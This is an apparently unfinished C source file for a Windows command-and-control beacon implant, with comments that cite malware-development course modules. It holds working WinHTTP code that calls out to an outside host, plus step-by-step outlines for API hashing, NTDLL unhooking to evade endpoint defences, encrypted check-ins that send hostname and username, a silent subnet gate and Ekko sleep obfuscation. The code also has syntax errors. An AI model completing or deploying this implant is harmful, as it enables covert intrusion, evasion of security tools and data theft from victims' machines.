#include "winhttp.h"
#include "windows.h"
#include "bcrypt.h"
#pragma comment(lib, "bcrypt.lib")
#define KEYSIZE 32
#define IVSIZE 16

typedef struct _AES{
  PBYTE pKey;
  PBYTE pIv;
  PBYTE pPlainText;//used for the encryption and decryption for input
  DWORD dwPlainSize;
  PBYTE pCipherText;// output
  DWORD dwCipherSize;
} AES, *PEAS;

VOID GenerateRandomBytes (PBYTE pBUffer, SIZE_T sSize)
{
for(int i =0;i<sSize;i++)
{
pBUffer[i]=(BYTE)rand() %0xFF;
}
}
// start checking call back to the reserve proxy
BOOL checking_connection(BOOL* Connection)
{
    *Connection =FALSE;
    //declairing  all handlers
HINTERNET hSession = NULL,
hConnect=NULL,
hRequest=NULL;
DWORD statusCode = 0;
DWORD statusSize =sizeof(DWORD);
BOOL theResponse=FALSE;

//create a session handle
hSession =WinHttpOpen(L"WinHTTP Please_Just_Trust_This_Agent/1.0",
WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
WINHTTP_NO_PROXY_NAME,
WINHTTP_NO_PROXY_BYPASS,
0);
if(!hSession)
{
goto ending_Check;
}
//connect to the reverse Proxy
hConnect = WinHttpConnect(hSession, L"www.the0dayworkshop.com", INTERNET_DEFAULT_HTTPS_PORT,0);
if(!hConnect)
{
goto ending_Check;
}
//Creating the POST request
hRequest = WinHttpOpenRequest(hConnect, L"GET",NULL,NULL,WINHTTP_NO_REFERER,WINHTTP_DEFAULT_ACCEPT_TYPES,WINHTTP_FLAG_SECURE);
if(!hRequest)
{
    goto ending_Check;
}
// putting it all on 17 black and let it ride
theResponse =WinHttpSendRequest(hRequest,WINHTTP_NO_ADDITIONAL_HEADERS,0,WINHTTP_NO_REQUEST_DATA,0,0,0);
// read the response
// if 200 set COnnection to TRUE
if(!theResponse)
{
    goto ending_Check;
}
if(!WinHttpReceiveResponse(hRequest,NULL))
{
    goto ending_Check;
}

WinHttpQueryHeaders(
    hRequest,
    WINHTTP_QUERY_STATUS_CODE| WINHTTP_QUERY_FLAG_NUMBER,
    WINHTTP_HEADER_NAME_BY_INDEX,
    &statusCode,
    &statusSize,
    WINHTTP_NO_HEADER_INDEX
);
 if (statusCode == 200)
 {
 *Connection =TRUE;
}


//else set connection to false
//close all connections 
if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
// return and ending layout
ending_Check:
    if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);
    return *Connection;
}

// API HASHING
/*
1. Walk PEB → find kernel32/winhttp in loaded modules
2. Parse export table → hash each exported function name
3. Match hash → return function pointer
4. Replace all WinHttpXxx() calls with hashed lookups
*/
//Mod 50,51,53,54,55

// hash a string at runtime using djb2
DWORD hash_string(const char* str) {
    // seed = 5381
    // for each char: hash = ((hash << 5) + hash) + char
    // return hash
    return 0;
}

// walk PEB to find a loaded module by hash
HMODULE get_module_by_hash(DWORD moduleHash) {
    // access PEB via __readgsqword(0x60)
    // walk PEB_LDR_DATA → InMemoryOrderModuleList
    // for each entry: hash the module name
    // if hash matches → return DllBase
    return NULL;
}

// walk export table to find a function by hash
FARPROC get_proc_by_hash(HMODULE hModule, DWORD funcHash) {
    // parse DOS header → NT headers → export directory
    // loop through AddressOfNames
        // hash each name string
        // if hash matches → get ordinal from AddressOfNameOrdinals
        // use ordinal to index AddressOfFunctions
        // return function pointer
    return NULL;
}

//ENcrypted the Payload
/*1. Derive AES key from a seed (hardcoded or negotiated)
2. Generate random 12-byte nonce per request
3. Encrypt your JSON/binary check-in body
4. Pack: [nonce 12B][tag 16B][ciphertext]
5. POST that blob — C2 decrypts on receive*/

//mod 19
static BYTE aes_key[32] = {
    0xDE, 0xAD, 0xBE, 0xEF, /* ... fill remaining 28 bytes */ 0x00
};

BOOL aes_encrypt_payload(
    BYTE*  plaintext,
    DWORD  plaintextLen,
    BYTE** outBlob,         // [nonce 12B][tag 16B][ciphertext]
    DWORD* outBlobLen
) {
    // generate random 12-byte nonce via BCryptGenRandom
    // initialize AES-GCM context with aes_key
    // encrypt plaintext → ciphertext + 16-byte tag
    // pack output: [nonce][tag][ciphertext]
    // set *outBlob and *outBlobLen
    // return TRUE on success
    return FALSE;
}

BOOL aes_decrypt_payload(
    BYTE*  blob,            // [nonce 12B][tag 16B][ciphertext]
    DWORD  blobLen,
    BYTE** outPlain,
    DWORD* outPlainLen
) {
    // extract nonce (first 12 bytes)
    // extract tag (next 16 bytes)
    // extract ciphertext (remainder)
    // initialize AES-GCM context with aes_key
    // decrypt and verify tag
    // set *outPlain and *outPlainLen
    // return TRUE on success
    return FALSE;
}


//NTDLL
/*
1. Open a fresh copy of ntdll.dll from disk
2. Map it into memory
3. Compare .text section to loaded (hooked) NTDLL
4. Overwrite hooked bytes with clean bytes
5. Call this ONCE before your beacon loop starts
*/

BOOL unhook_ntdll()
{
    // maldev 83,84

    // open ntdll.dll from disk with CreateFileW
    // get file size with GetFileSize
    // allocate buffer with VirtualAlloc (RW)
    // read file bytes into buffer with ReadFile
    // close file handle

    // get base address of loaded (hooked) ntdll via PEB
    // parse PE headers to find .text section offset + size
    // change memory protection of loaded .text to RWX via VirtualProtect
    // memcpy clean .text bytes over hooked .text bytes
    // restore original memory protection via VirtualProtect

    // free buffer
    // return TRUE on success

    return FALSE;
}
}

//IP WhiteList Gate
/*
1. Call GetAdaptersInfo() → enumerate NICs
2. Check IP against expected subnet (e.g. 10.10.30.0/24)
3. If not in range → ExitProcess(0) silently
4. If in range → continue to beacon loop
*/
BOOL ip_whitelist_gate()
{
    //mod 21,73
    // declare IP_ADAPTER_INFO buffer
    // call GetAdaptersInfo() to enumerate NICs
    // loop through each adapter
        // get adapter IP address string
        // convert to DWORD with inet_addr()
        // apply subnet mask (e.g. 255.255.255.0)
        // compare masked IP to expected subnet (e.g. 10.10.30.0)
        // if match → return TRUE
    // if no match → ExitProcess(0)

    return FALSE;
}

//Ekko Sleep
/*
1. Before sleeping → encrypt beacon .text section in memory
2. Queue APC timer for sleep duration
3. Beacon image is encrypted garbage during sleep
4. On wake → decrypt .text section
5. Resume beacon loop
*/
//mod 144,145
VOID ekko_sleep(DWORD sleepMs) {

    // get base address of current image via GetModuleHandleW(NULL)
    // parse PE to find .text section base + size

    // create event objects: hSleepStart, hSleepEnd
    // create a timer queue via CreateTimerQueue

    // queue timer callback 1 (fires at t=0):
        // VirtualProtect .text → RW
        // XOR/encrypt .text section with key
        // VirtualProtect .text → RX

    // queue timer callback 2 (fires at t=sleepMs):
        // VirtualProtect .text → RW
        // XOR/decrypt .text section with key
        // VirtualProtect .text → RX
        // set hSleepEnd event

    // set hSleepStart event to kick off timer chain
    // WaitForSingleObject(hSleepEnd, sleepMs + 1000)

    // clean up timer queue and event handles
}


//POST CHECK-IN
//Mod 30,19,55

BOOL beacon_post(
    BYTE*  payload,
    DWORD  payloadLen,
    BYTE** responseOut,
    DWORD* responseLenOut
) {
    // encrypt payload with aes_encrypt_payload()

    // resolve WinHttpOpen via get_proc_by_hash()
    // resolve WinHttpConnect via get_proc_by_hash()
    // resolve WinHttpOpenRequest via get_proc_by_hash()
    // resolve WinHttpSendRequest via get_proc_by_hash()
    // resolve WinHttpReceiveResponse via get_proc_by_hash()
    // resolve WinHttpReadData via get_proc_by_hash()
    // resolve WinHttpCloseHandle via get_proc_by_hash()

    // open session (hashed call)
    // connect to C2 (hashed call)
    // open POST request to /check-in URI (hashed call)
    // send encrypted blob as request body (hashed call)
    // receive response (hashed call)
    // loop WinHttpReadData into buffer until complete
    // decrypt response buffer with aes_decrypt_payload()
    // set *responseOut and *responseLenOut
    // close all handles
    // return TRUE on success

    return FALSE;
}
// Jitter check in at random variables
DWORD jitter(DWORD baseMs) {
    // generate random DWORD via BCryptGenRandom
    // jitter range = baseMs * 0.20 (20% variance)
    // return baseMs + (random % jitterRange)
    return baseMs;
}

VOID beacon_run() {

    // STEP 1 — unhook NTDLL before anything else
    unhook_ntdll();

    // STEP 2 — check IP whitelist gate
    // if not in expected subnet → ExitProcess(0)
    ip_whitelist_gate();

    // STEP 3 — verify C2 is reachable
    BOOL connected = FALSE;
    checking_connection(&connected);
    if (!connected) {
        ExitProcess(0);
    }

    // STEP 4 — main beacon loop
    while (1) {

        // build check-in struct (hostname, username, PID, arch)
        // serialize to JSON or binary blob

        // encrypt and POST to C2
        BYTE* taskBlob    = NULL;
        DWORD taskBlobLen = 0;
        beacon_post(
            /* checkin payload */,
            /* checkin len     */,
            &taskBlob,
            &taskBlobLen
        );

        // if task received → pass to task dispatcher
        if (taskBlob && taskBlobLen > 0) {
            dispatch_task(taskBlob, taskBlobLen);  // defined in tasks.c
        }

        // sleep with Ekko obfuscation + jitter
        ekko_sleep(jitter(30000));  // 30 second base interval
    }
}